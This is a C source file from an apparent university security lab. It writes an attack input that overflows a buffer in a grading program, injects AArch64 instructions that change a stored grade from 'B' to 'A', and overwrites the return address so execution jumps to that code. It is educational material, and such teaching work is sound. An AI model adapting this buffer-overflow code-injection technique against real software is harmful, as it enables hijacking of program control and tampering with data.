/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Isaac Wolfe                                                */
/* netid: iwolfe                                                      */
/*--------------------------------------------------------------------*/

#include "miniassembler.h"
#include <stdio.h>

/*--------------------------------------------------------------------*/

/* Write to a file my name ("Isaac Wolfe") followed by a single '/0' 
   character. Then write the machine language instructions to
   make the grade variable equal 'A' instead of 'B' (with mov, adr 
   and strb) Then branch to the address of the place in main after
   the assignemnt of the grade statemet to 'B'. Finally, fill in
   more NULL characters and write the address of the point in BSS 
   where the grade is changed to 'A' on the return register. */

int main(void)
{
	FILE *psFile;
	/* LENGTH of printed NULL characters
	   LENGTH = 48 - (length of name & null (12) + instructons (16)) */
	int LENGTH = 20;
	char name[] = "Isaac Wolfe";
	unsigned long gradeAddress = 0x420044;
	unsigned long bMainAddress = 0x400864;
	unsigned long bssAddress = 0x420064;
	unsigned long adrInstrAddress = 0x420068; 
	unsigned long bInstrAddress = 0x420070;
	unsigned int movInstr;
	unsigned int adrInstr;
	unsigned int strbInstr;
	unsigned int bInstr;
	int i;

	/* Get machine language of mov w0, 'A' */
	movInstr = MiniAssembler_mov(0, 'A');
	/* Get machine language of adr x1, grade */
	adrInstr = MiniAssembler_adr(1, gradeAddress, adrInstrAddress);
	/* Get machine language of strb w0, [x1] */
	strbInstr = MiniAssembler_strb(0, 1);
	/* Get machine language of b 0x400864 <main+68> */
	bInstr = MiniAssembler_b(bMainAddress, bInstrAddress);

	/* Open file and print my name with NULL character after. */
	psFile = fopen("dataA", "w");
	fprintf(psFile, "%s", name);
	putc('\0', psFile);

	/* Print machine language instructions to change grade. */
	fwrite(&movInstr, sizeof(unsigned int), 1, psFile);
	fwrite(&adrInstr, sizeof(unsigned int), 1, psFile);
	fwrite(&strbInstr, sizeof(unsigned int), 1, psFile);

	/* Print jump to print line in main (skipping comparisons). */
	fwrite(&bInstr, sizeof(unsigned int), 1, psFile);

	/* Fill in BSS with NULL characters. */
	for (i = 0; i < LENGTH; i++) 
	{
		putc('\0', psFile);
	}

	/* Insert machine language instrucitons on return register
	   that branches to the beginning of instrucitons in BSS. */
	fwrite(&bssAddress, sizeof(unsigned long), 1, psFile);

	/* Close file and return */
	fclose(psFile);
	return 0;
}
